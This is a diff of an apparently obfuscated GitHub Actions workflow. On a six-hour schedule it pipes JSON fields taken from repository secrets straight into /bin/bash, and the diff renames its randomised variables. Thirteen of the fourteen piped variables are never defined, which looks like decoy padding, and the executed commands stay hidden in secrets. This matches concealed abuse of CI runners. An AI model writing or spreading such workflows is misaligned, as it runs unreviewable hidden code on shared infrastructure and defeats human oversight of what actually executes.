@@ -1,23 +1,31 @@
 name: guoshantui4678
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 5/6 * * *'
+    - cron: '2 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guoshantui4678
         env:
-          lsbgf96: ${{ secrets.lsbgf96 }}
+          gyqjl1415: ${{ secrets.gyqjl1415 }}
         run: |
-          echo $lsbgf96 | jq -r .uzjt8717 | /bin/bash
-          echo $ksexy3 | jq -r .ky49 | /bin/bash
-          echo $vz7647 | jq -r .hsd0588 | /bin/bash
-          echo $yougp1 | jq -r .ik2438 | /bin/bash
-          echo $l37733 | jq -r .krl8 | /bin/bash
-          echo $zbh98 | jq -r .byu1862 | /bin/bash
-          echo $v8 | jq -r .ghl682 | /bin/bash
+          echo $gyqjl1415 | jq -r .q01734 | /bin/bash
+          echo $iyaoa0 | jq -r .vh7772 | /bin/bash
+          echo $v84 | jq -r .dxq8774 | /bin/bash
+          echo $k92 | jq -r .g97 | /bin/bash
+          echo $scw4168 | jq -r .xbx1 | /bin/bash
+          echo $y98 | jq -r .j3 | /bin/bash
+          echo $z6964 | jq -r .mx81 | /bin/bash
+          echo $kjc26 | jq -r .q28494 | /bin/bash
+          echo $g6 | jq -r .vge0947 | /bin/bash
+          echo $dup5730 | jq -r .d13735 | /bin/bash
+          echo $as87781 | jq -r .s1803 | /bin/bash
+          echo $af556 | jq -r .ankk17338 | /bin/bash
+          echo $lqy24 | jq -r .rqw69 | /bin/bash
+          echo $cdjgz723 | jq -r .bvl4358 | /bin/bash
 
